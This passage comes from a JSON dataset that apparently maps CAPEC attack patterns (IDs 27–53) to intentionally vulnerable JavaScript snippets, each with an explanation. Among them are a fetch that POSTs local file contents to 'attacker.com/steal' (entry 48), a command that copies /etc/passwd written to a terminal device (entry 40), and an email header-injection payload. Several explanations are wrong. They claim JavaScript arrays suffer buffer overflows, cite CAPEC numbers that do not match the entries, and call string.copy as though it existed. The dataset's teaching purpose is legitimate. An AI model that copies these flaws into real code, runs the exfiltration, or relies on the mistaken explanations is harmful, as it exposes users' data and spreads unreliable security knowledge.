        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst filePath = path.join(__dirname, 'important_file.txt');\n\n// Check if the file exists\nif (fs.existsSync(filePath)) {\n  // Simulate a delay to create a race condition window\n  setTimeout(() => {\n    // Read the file content\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) throw err;\n      console.log('File content:', data);\n    });\n  }, 1000);\n}\n\n// Simulate an attacker replacing the file during the delay\nsetTimeout(() => {\n  fs.writeFile(filePath, 'Malicious content', (err) => {\n    if (err) throw err;\n    console.log('File replaced with malicious content');\n  });\n}, 500);",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability. The code first checks if a file exists and then reads its content after a delay. During this delay, an attacker can replace the file with malicious content. This embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and CWE-363 (Race Condition Enabling Link Following). The race condition occurs because the file's existence is checked before the delay, allowing an attacker to replace the file before it is read, leading to potential security issues."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst tempFilePath = '/tmp/tempfile';\nconst sensitiveFilePath = '/etc/sensitivefile';\n\n// Check if the temporary file exists\nif (!fs.existsSync(tempFilePath)) {\n  // Simulate a race condition by creating a symlink to the sensitive file\n  fs.symlinkSync(sensitiveFilePath, tempFilePath);\n\n  // Create and write to the temporary file\n  fs.writeFileSync(tempFilePath, 'malicious content');\n\n  console.log('Temporary file created and written to.');\n} else {\n  console.log('Temporary file already exists.');\n}",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability involving symbolic links. The code first checks if a temporary file exists. If it does not, it creates a symbolic link pointing to a sensitive file. Then, it writes to the temporary file, which actually writes to the sensitive file due to the symbolic link. This embodies the main idea of the CAPEC by showing how an attacker can exploit a time-of-check time-of-use (TOCTOU) race condition to write to a sensitive file using a symbolic link. The related CWEs are represented by the improper handling of symbolic links (CWE-61), the race condition (CWE-367), and the lack of proper synchronization (CWE-662)."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let input = req.url.split('?')[1];\n  try {\n    // CWE-20: Improper Input Validation\n    if (!input) throw new Error('No input provided');\n\n    // CWE-74: Improper Neutralization of Special Elements\n    if (input.includes('<script>')) throw new Error('Potential XSS attack');\n\n    // CWE-209: Generation of Error Message Containing Sensitive Information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Received input: ${input}`);\n  } catch (err) {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Error: ${err.message}`);\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens for incoming requests. The server extracts input from the URL query string and performs basic validation. If the input is missing or contains a potential XSS attack vector (e.g., '<script>'), an error is thrown. The server then responds with either the received input or an error message. This code demonstrates the concept of fuzzing by showing how improper input validation (CWE-20) and improper neutralization of special elements (CWE-74) can lead to vulnerabilities. Additionally, it highlights the risk of generating error messages that contain sensitive information (CWE-209)."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "const fs = require('fs');\nconst filePath = '/tmp/sensitive_file';\n\n// Time-of-check\nif (fs.existsSync(filePath)) {\n  console.log('File exists, proceeding to read...');\n  \n  // Simulate a delay to create a window for race condition\n  setTimeout(() => {\n    // Time-of-use\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) throw err;\n      console.log('File content:', data);\n    });\n  }, 1000); // Delay of 1 second\n} else {\n  console.log('File does not exist.');\n}",
        "description": "This JavaScript code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition vulnerability. The code first checks if a file exists at a specified path ('/tmp/sensitive_file'). If the file exists, it waits for 1 second before reading the file's content. This delay creates a window where an attacker could potentially replace or modify the file between the check (existsSync) and the use (readFile). This embodies the main idea of CAPEC-367, where the state of a resource can change between the check and the use, leading to unexpected behavior. The related CWEs provide additional context, such as improper synchronization and race conditions within threads, which are relevant to this example."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// CWE-114: Load a library from an untrusted source\nconst maliciousLibrary = './maliciousLibrary.so';\n\n// CWE-270: Privilege Context Switching Error\nfunction elevatePrivileges() {\n  // Simulate privilege escalation\n  process.setuid(0); // Set user ID to root (privileged)\n}\n\n// CWE-362: Race Condition\nlet sharedResource = 'safe';\nfunction manipulateSharedResource() {\n  if (sharedResource === 'safe') {\n    sharedResource = 'unsafe';\n  }\n}\n\n// CWE-78: OS Command Injection\nfunction executeCommand(command) {\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Simulate hijacking a privileged thread\nfunction hijackThread() {\n  elevatePrivileges();\n  manipulateSharedResource();\n  executeCommand(`ls ${maliciousLibrary}`); // Potential OS Command Injection\n}\n\n// Simulate the attack\nhijackThread();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Hijacking a Privileged Thread of Execution' by combining several related CWEs. The code simulates privilege escalation (CWE-270) by setting the user ID to root, manipulates a shared resource in a race condition (CWE-362), and executes a command that could be vulnerable to OS command injection (CWE-78). Additionally, it loads a library from an untrusted source (CWE-114). The main idea is to show how an attacker can hijack a privileged thread to execute malicious actions, potentially evading detection and gaining elevated privileges."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  // Assume user authentication is successful\n  res.cookie('session', JSON.stringify({ username, role: 'user' }), { httpOnly: false }); // CWE-315, CWE-539\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  const session = JSON.parse(req.cookies.session); // CWE-565, CWE-642\n  if (session && session.username) {\n    res.send(`Welcome ${session.username}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that uses cookies to manage user sessions. The '/login' endpoint sets a cookie with the session information in cleartext (CWE-315) and without the 'httpOnly' flag (CWE-539), making it accessible to client-side scripts. The '/dashboard' endpoint reads the session cookie without validating its integrity or authenticity (CWE-565, CWE-642). This setup is vulnerable to attacks where an adversary can intercept, modify, or forge cookies to gain unauthorized access or impersonate a user, embodying the main idea of CAPEC-Accessing/Intercepting/Modifying HTTP Cookies."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  // Vulnerable code: directly using user input in HTML without proper sanitization\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body><h1>User Input: ${userInput}</h1></body></html>`);\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server parses the query string from the URL to extract user input and then directly embeds this input into an HTML response without any sanitization or escaping. This represents the CAPEC 'XSS Through HTTP Query Strings' by demonstrating how an attacker can inject malicious script code through the query string, which is then executed by the victim's browser. The related CWEs are illustrated by the lack of proper neutralization of script-related HTML tags (CWE-80), improper neutralization of input during web page generation (CWE-79), and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n  });\n  req.on('end', () => {\n    // Vulnerable to HTTP Request Smuggling\n    if (body.includes('Content-Length: 0\\r\\n\\r\\nPOST /malicious HTTP/1.1')) {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Request Smuggled');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Hello World');\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that is vulnerable to HTTP Request Smuggling. The server reads the incoming request body and checks if it contains a specific malicious payload that includes a 'Content-Length: 0' header followed by another HTTP request. If such a payload is detected, the server responds with 'Request Smuggled'. This demonstrates how discrepancies in HTTP request parsing can be exploited to smuggle unauthorized requests to the backend server. The code also highlights related weaknesses such as improper neutralization of CRLF sequences (CWE-113) and inconsistent interpretation of HTTP requests (CWE-444)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url.split('?')[1]; // Assume user input is taken from URL query string\n  if (userInput) {\n    // Vulnerable to HTTP Response Splitting\n    res.setHeader('Content-Type', 'text/html');\n    res.setHeader('Set-Cookie', `sessionId=abc123; path=/; ${userInput}`);\n    res.end('<html><body>Response</body></html>');\n  } else {\n    res.end('<html><body>No Input</body></html>');\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server takes user input from the URL query string and includes it in the 'Set-Cookie' HTTP header without proper sanitization. This makes the server vulnerable to HTTP Response Splitting attacks (CWE-113). An attacker can inject CRLF sequences into the user input to manipulate the HTTP response headers, potentially injecting malicious content or splitting the response into multiple parts. This example highlights the importance of properly neutralizing special elements in user input to prevent such vulnerabilities."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "const fs = require('fs');\nconst configPath = 'config.json';\n\n// Read configuration file\nlet configData = fs.readFileSync(configPath, 'utf8');\n\n// Vulnerable: Directly evaluating the content of the configuration file\ntry {\n  let config = JSON.parse(configData);\n  if (config.execute) {\n    eval(config.execute); // CWE-95: Eval Injection\n  }\n} catch (err) {\n  console.error('Error parsing config:', err);\n}\n",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can leverage executable code in a non-executable file, specifically a configuration file. The code reads a configuration file ('config.json') and directly evaluates its content using 'eval', which is a classic example of CWE-95 (Eval Injection). If an attacker modifies the 'config.json' file to include malicious code in the 'execute' field, the 'eval' function will execute this code, potentially compromising the system. This snippet embodies the main idea of CAPEC-184 by showing how trust in configuration files can be exploited to execute malicious code."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "function unpublishedFunction() {\n    // Undocumented and unpublished functionality\n    console.log('This is an unpublished function');\n}\n\nfunction main() {\n    // No authentication or authorization checks\n    if (userInput === 'invoke') {\n        unpublishedFunction();\n    }\n}\n\n// Simulate user input\nlet userInput = 'invoke';\nmain();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Using Unpublished Interfaces or Functionality' (CAPEC). The 'unpublishedFunction' is an undocumented and unpublished function that should not be publicly accessible. The 'main' function allows invocation of 'unpublishedFunction' based on user input without performing any authentication or authorization checks, embodying CWE-306 (Missing Authentication for Critical Function) and CWE-862 (Missing Authorization). This lack of security checks represents a significant vulnerability, as unauthorized users can access and execute sensitive functionality."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "const sensitiveData = 'user_password';\n\n// Store sensitive data in local storage (CWE-312)\nlocalStorage.setItem('password', sensitiveData);\n\n// Store sensitive data in a cookie (CWE-315)\ndocument.cookie = `password=${sensitiveData}; path=/;`;\n\n// Store sensitive data in cleartext in a variable (CWE-318)\nconst embeddedSensitiveData = 'API_KEY_12345';\n\n// Function to simulate improper zeroization (CWE-226)\nfunction releaseResource() {\n  let resource = sensitiveData;\n  // Resource is released without clearing sensitive data\n  resource = null;\n}\n\nreleaseResource();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Retrieve Embedded Sensitive Data'. It stores sensitive information in local storage, cookies, and cleartext variables, making it easily accessible to attackers. Additionally, it simulates improper zeroization by releasing a resource without clearing the sensitive data it contained. This code embodies the main idea of the CAPEC by showing how sensitive data can be embedded within a system and potentially exposed due to improper handling and storage practices."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// User-controlled input for the search path\nlet userProvidedPath = process.argv[2];\n\n// Vulnerable code: using user-provided path to load a configuration file\nlet configFilePath = path.join(userProvidedPath, 'config.json');\n\nfs.readFile(configFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading config file:', err);\n    return;\n  }\n  try {\n    let config = JSON.parse(data);\n    console.log('Configuration loaded:', config);\n  } catch (parseErr) {\n    console.error('Error parsing config file:', parseErr);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an application uses a user-provided path to load a configuration file. The `userProvidedPath` is taken from command-line arguments, which can be controlled by an attacker. The code then constructs the full path to the configuration file using this user input and attempts to read and parse the file. This embodies the CAPEC 'Leveraging/Manipulating Configuration File Search Paths' by allowing an attacker to influence the search path and potentially load a malicious configuration file. The related CWEs are represented as follows: CWE-426 and CWE-427 (Untrusted and Uncontrolled Search Path), CWE-73 (External Control of File Name or Path), and CWE-99 (Improper Control of Resource Identifiers)."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const user = req.query.user;\n  // Assume user authentication is done here\n  res.cookie('auth', user, { httpOnly: true });\n  res.send('Logged in');\n});\n\napp.get('/profile', (req, res) => {\n  const authCookie = req.cookies.auth;\n  if (authCookie) {\n    // No integrity check on the cookie\n    res.send(`Welcome back, ${authCookie}`);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that uses cookies for authentication without proper integrity checks. The '/login' endpoint sets an 'auth' cookie with the username, and the '/profile' endpoint retrieves this cookie to display a welcome message. The code embodies the CAPEC concept of 'Manipulating Opaque Client-based Data Tokens' by showing how an attacker could manipulate the 'auth' cookie to impersonate another user. The related CWEs are represented as follows: CWE-353 (Missing Support for Integrity Check) is shown by the lack of integrity verification for the cookie, CWE-285 (Improper Authorization) is implied by the simplistic authorization check, CWE-302 (Authentication Bypass by Assumed-Immutable Data) and CWE-472 (External Control of Assumed-Immutable Web Parameter) are demonstrated by the assumption that the cookie value is immutable and trustworthy, and CWE-315 (Cleartext Storage of Sensitive Information in a Cookie) is shown by storing the username in cleartext in the cookie."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// Simulate writing to a terminal device\nconst terminalDevice = '/dev/pts/1';\nconst maliciousCommand = 'cat /etc/passwd > /tmp/stolen_passwd\\n';\n\nfs.writeFile(terminalDevice, maliciousCommand, (err) => {\n  if (err) throw err;\n  console.log('Malicious command sent to terminal device');\n});\n\n// Simulate attacker collecting the results\nexec('cat /tmp/stolen_passwd', (err, stdout, stderr) => {\n  if (err) throw err;\n  console.log('Collected data:', stdout);\n});",
        "description": "This JavaScript code snippet demonstrates the concept of 'Manipulating Writeable Terminal Devices' (CAPEC-Name). The code writes a malicious command to a terminal device, hoping that the user will execute it. The command copies the contents of '/etc/passwd' to a temporary file, which the attacker then reads. This example also highlights related CWEs: CWE-77 and CWE-78 (Command Injection), CWE-214 (Sensitive Information Exposure), and CWE-114 (Process Control). The code is vulnerable because it assumes the terminal device is writable and does not properly sanitize the input, leading to potential command injection and sensitive data exposure."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "function sendEmail(to, subject, body) {\n    var emailHeaders = `To: ${to}\\nSubject: ${subject}\\n`;\n    var emailBody = body;\n    var email = emailHeaders + '\\n' + emailBody;\n    // Simulate sending email\n    console.log('Sending email:', email);\n}\n\n// Example usage\nvar maliciousPayload = \"\\nBcc: victim@example.com\\n\\n<script>alert('Hacked!');</script>\";\nsendEmail('user@example.com', 'Hello', 'This is a test email.' + maliciousPayload);",
        "description": "This JavaScript code snippet demonstrates how an attacker can inject malicious payloads into email headers by exploiting improper neutralization of meta-characters. The `sendEmail` function constructs an email with headers and body, but it does not properly sanitize or escape the input. The `maliciousPayload` variable contains a newline character followed by a Bcc header and a script tag, which gets injected into the email body. When the email is processed by an email client, the malicious script could be executed, demonstrating the vulnerability described in the CAPEC. This example highlights the importance of proper input validation and escaping to prevent such attacks."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "function convertToMIME(input) {\n  let buffer = new Array(256);\n  for (let i = 0; i < input.length; i++) {\n    buffer[i] = input.charCodeAt(i);\n  }\n  return buffer;\n}\n\nlet maliciousInput = 'A'.repeat(300);\nconvertToMIME(maliciousInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable MIME conversion routine. The function `convertToMIME` takes an input string and attempts to convert it to a MIME-compatible format by copying each character's char code into a fixed-size buffer of 256 elements. However, the function does not check if the input length exceeds the buffer size, leading to a classic buffer overflow (CWE-120). This can cause the program to write outside the bounds of the buffer (CWE-119), potentially allowing an attacker to execute arbitrary code. The `maliciousInput` variable simulates an attack by providing an input string longer than the buffer size, triggering the overflow."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "function processInput(input) {\n  // First parser layer\n  input = input.replace(/\\\\/g, ''); // Remove escape characters\n  \n  // Input validation layer\n  if (/[^a-zA-Z0-9]/.test(input)) {\n    throw new Error('Invalid input detected');\n  }\n  \n  // Second parser layer\n  input = input.replace(/\\$/g, ''); // Remove dollar signs\n  \n  // Use the input in a command\n  const command = `echo ${input}`;\n  require('child_process').exec(command, (err, stdout, stderr) => {\n    if (err) {\n      console.error(`Error: ${stderr}`);\n    } else {\n      console.log(`Output: ${stdout}`);\n    }\n  });\n}\n\n// Example usage\ntry {\n  processInput('valid\\$input');\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates the concept of 'Exploiting Multiple Input Interpretation Layers' (CAPEC-173). The function `processInput` processes user input through multiple layers: an initial parser that removes escape characters, an input validation layer that checks for invalid characters, and a second parser that removes dollar signs. The input is then used in an OS command. The vulnerability arises because the input validation occurs before the second parser, allowing an attacker to bypass validation by using special characters that are only revealed after the second parsing step. For example, the input 'valid\\$input' would pass validation but result in 'validinput' after the second parser, potentially leading to command injection (CWE-78)."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "function loadImage(file) {\n  const reader = new FileReader();\n  reader.onload = function(event) {\n    const buffer = new ArrayBuffer(1024); // Fixed buffer size\n    const view = new Uint8Array(buffer);\n    const data = new Uint8Array(event.target.result);\n    for (let i = 0; i < data.length; i++) {\n      view[i] = data[i]; // Potential buffer overflow\n    }\n    // Process the image data\n    processImage(view);\n  };\n  reader.readAsArrayBuffer(file);\n}\n\nfunction processImage(data) {\n  // Dummy function to process image data\n  console.log('Processing image data:', data);\n}",
        "description": "This JavaScript code snippet demonstrates a potential buffer overflow vulnerability when handling binary resources, such as image files. The `loadImage` function reads a file using the FileReader API and attempts to copy its contents into a fixed-size buffer. If the file size exceeds the buffer size, this can lead to a buffer overflow, allowing an attacker to execute arbitrary code. This example embodies the main idea of CAPEC-Overflow Binary Resource File and highlights CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readSymbolicLink(filePath) {\n  try {\n    const resolvedPath = fs.readlinkSync(filePath);\n    const buffer = Buffer.alloc(256); // Fixed buffer size\n    const data = fs.readFileSync(resolvedPath, 'utf8');\n\n    // CWE-120: Buffer Copy without Checking Size of Input\n    data.copy(buffer, 0, 0, data.length);\n\n    console.log('Data:', buffer.toString());\n  } catch (err) {\n    console.error('Error:', err);\n  }\n}\n\n// Example usage\nreadSymbolicLink('/path/to/symlink');",
        "description": "This JavaScript code snippet demonstrates a potential buffer overflow vulnerability via symbolic links. The function `readSymbolicLink` takes a file path, resolves the symbolic link, and reads the content of the target file. It then attempts to copy the content into a fixed-size buffer without checking if the content size exceeds the buffer size, leading to a classic buffer overflow (CWE-120). This example embodies the main idea of the CAPEC by showing how symbolic links can be manipulated to cause buffer overflows due to insufficient bounds checking."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "function processConfig(config) {\n    var buffer = new Array(256);\n    for (var i = 0; i < config.tags.length; i++) {\n        buffer[i] = config.tags[i]; // CWE-120: No size check\n    }\n    return buffer.join('');\n}\n\nvar maliciousConfig = {\n    tags: new Array(300).fill('A') // Oversized input to cause overflow\n};\n\nconsole.log(processConfig(maliciousConfig));",
        "description": "This JavaScript code snippet demonstrates a vulnerability where a configuration object with tags is processed without proper size checks, leading to a buffer overflow. The function `processConfig` takes a configuration object and copies its tags into a fixed-size buffer of 256 elements. However, it does not check if the number of tags exceeds the buffer size, leading to a classic buffer overflow (CWE-120). The `maliciousConfig` object is crafted with 300 tags, which exceeds the buffer size and causes an overflow. This snippet embodies the main idea of the CAPEC by showing how oversized strings in a configuration file can lead to a buffer overflow. The related CWEs provide additional context on the types of weaknesses that can be exploited in such scenarios."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10);\n  var expandedInput = input.repeat(2); // Expands the input size\n  for (var i = 0; i < expandedInput.length; i++) {\n    buffer[i] = expandedInput[i]; // No bounds checking\n  }\n  return buffer.join('');\n}\n\n// Example usage\nvar userInput = '1234567890';\nconsole.log(vulnerableFunction(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The function `vulnerableFunction` takes an input string and expands it by repeating it twice. It then attempts to copy the expanded input into a fixed-size buffer of 10 elements without performing any bounds checking. This can lead to a buffer overflow if the expanded input exceeds the buffer size. The code embodies the main idea of CAPEC-Buffer Overflow via Parameter Expansion and incorporates related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "function fetchResource(resource) {\n  if (resource.startsWith('http://') || resource.startsWith('https://')) {\n    fetch(resource)\n      .then(response => response.text())\n      .then(data => console.log(data))\n      .catch(error => console.error('Error fetching URL:', error));\n  } else {\n    fetch('file://' + resource)\n      .then(response => response.text())\n      .then(data => {\n        // Send the local file data to an external server\n        fetch('http://attacker.com/steal', {\n          method: 'POST',\n          headers: { 'Content-Type': 'application/json' },\n          body: JSON.stringify({ fileData: data })\n        });\n      })\n      .catch(error => console.error('Error fetching local file:', error));\n  }\n}\n\n// Example usage\nfetchResource('C:/Users/username/Documents/sensitive.txt');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where a function `fetchResource` is designed to fetch resources based on a given input. The function checks if the input starts with 'http://' or 'https://', and if so, it fetches the resource as a URL. If the input does not start with these prefixes, it treats the input as a local file path and attempts to fetch it using the 'file://' scheme. The fetched local file data is then sent to an external server controlled by an attacker. This embodies the CAPEC idea of passing local filenames to functions expecting a URL, potentially exposing sensitive local files. The code also touches on related CWEs, such as improper handling of unexpected data types (CWE-241), use of incorrectly-resolved names or references (CWE-706), and improper neutralization of encoded URI schemes (CWE-84)."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'qwerty' }; // CWE-521: Weak Password Requirements\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Authenticated';\n  } else {\n    return 'Authentication Failed';\n  }\n}\n\nlet attempts = 0;\nconst MAX_ATTEMPTS = 5; // CWE-307: Improper Restriction of Excessive Authentication Attempts\n\nfunction login(username, password) {\n  if (attempts >= MAX_ATTEMPTS) {\n    return 'Account locked. Too many failed attempts.';\n  }\n  const result = authenticate(username, password);\n  if (result === 'Authentication Failed') {\n    attempts++;\n  } else {\n    attempts = 0; // Reset attempts on successful login\n  }\n  return result;\n}\n\nconsole.log(login('user1', 'wrongpassword')); // Attempt 1\nconsole.log(login('user1', 'wrongpassword')); // Attempt 2\nconsole.log(login('user1', 'wrongpassword')); // Attempt 3\nconsole.log(login('user1', 'wrongpassword')); // Attempt 4\nconsole.log(login('user1', 'wrongpassword')); // Attempt 5\nconsole.log(login('user1', 'password123')); // Account locked",
        "description": "This JavaScript code snippet demonstrates a simple authentication system that embodies the main idea of CAPEC-112: Password Brute Forcing. The code includes weak password requirements (CWE-521) by using simple passwords, and it also shows improper restriction of excessive authentication attempts (CWE-307) by allowing multiple failed login attempts before locking the account. The `authenticate` function checks if the provided username and password match the stored credentials. The `login` function tracks the number of failed attempts and locks the account after a certain number of failures, simulating a basic defense against brute force attacks. However, the weak passwords and simplistic approach highlight the vulnerabilities described in the related CWEs."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "const users = { 'user1': { 'password': 'password123', 'securityQuestion': 'petName', 'securityAnswer': 'fluffy' } }; \n\nfunction recoverPassword(username, answer) { \n  if (users[username] && users[username].securityAnswer === answer) { \n    return users[username].password; \n  } else { \n    return 'Security answer incorrect'; \n  } \n} \n\nconsole.log(recoverPassword('user1', 'fluffy')); // Outputs: password123",
        "description": "This JavaScript code snippet demonstrates a weak password recovery mechanism. It stores user passwords in a recoverable format and uses a simple security question for password recovery. If an attacker knows or guesses the answer to the security question, they can retrieve the user's password. This embodies the main idea of CAPEC-139 (Password Recovery Exploitation) and highlights related CWEs such as CWE-640 (Weak Password Recovery Mechanism for Forgotten Password), CWE-257 (Storing Passwords in a Recoverable Format), and CWE-522 (Insufficiently Protected Credentials). The code is vulnerable because it allows easy retrieval of passwords, which can be exploited by attackers."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst registry = {};\n\n// Improper Authorization\napp.post('/register', (req, res) => {\n  const { serviceName, serviceUrl } = req.body;\n  registry[serviceName] = serviceUrl;\n  res.send('Service registered');\n});\n\n// Cleartext Storage in the Registry\napp.get('/lookup', (req, res) => {\n  const { serviceName } = req.query;\n  if (registry[serviceName]) {\n    res.send(`Service URL: ${registry[serviceName]}`);\n  } else {\n    res.status(404).send('Service not found');\n  }\n});\n\n// Exposure of WSDL File Containing Sensitive Information\napp.get('/wsdl', (req, res) => {\n  res.sendFile('/path/to/wsdl/file.wsdl');\n});\n\napp.listen(3000, () => {\n  console.log('Registry service running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple web service registry using Express.js. It embodies the main idea of the CAPEC 'Poison Web Service Registry' by demonstrating how a registry can be poisoned due to several vulnerabilities:\n\n1. **Improper Authorization (CWE-285)**: The `/register` endpoint allows any client to register a service without proper authorization checks, making it easy for an attacker to register a malicious service.\n\n2. **Cleartext Storage in the Registry (CWE-314)**: The service URLs are stored in cleartext within the `registry` object, which can be easily accessed and manipulated.\n\n3. **Exposure of WSDL File Containing Sensitive Information (CWE-651)**: The `/wsdl` endpoint serves a WSDL file that may contain sensitive information about the web services, potentially exposing details that can be exploited by attackers.\n\nThis code snippet highlights the risks associated with a poorly secured web service registry, which can lead to service redirection, incorrect information dissemination, and exposure of sensitive data."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filename) {\n  if (!filename) {\n    throw new Error('Filename is required');\n  }\n\n  // Vulnerable to null byte injection\n  fs.readFile(filename + '\\0.txt', 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    console.log('File content:', data);\n  });\n}\n\n// Example usage\nreadFile('example');",
        "description": "This JavaScript code snippet demonstrates a vulnerability to null byte injection. The `readFile` function takes a filename as input and appends a null byte (`\\0`) followed by `.txt` to the filename before reading the file. In some environments, the null byte can terminate the string early, causing the file read operation to behave unexpectedly. This can lead to security issues such as reading unintended files. The code does not properly neutralize the null byte, making it susceptible to attacks that exploit this behavior. This example embodies the main idea of CAPEC-Embbeding NULL Bytes and is related to CWE-158 (Improper Neutralization of Null Byte or NUL Character) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "function validateInput(input) {\n  // Check if the input ends with a slash\n  if (input.endsWith('/')) {\n    // Remove the trailing slash for further processing\n    input = input.slice(0, -1);\n  }\n  // Check for null byte in the input\n  if (input.includes('\\0')) {\n    throw new Error('Invalid input: contains null byte');\n  }\n  // Further processing of the input\n  console.log('Processed input:', input);\n}\n\n// Example usage\ntry {\n  validateInput('example\\0/');\n} catch (e) {\n  console.error(e.message);\n}",
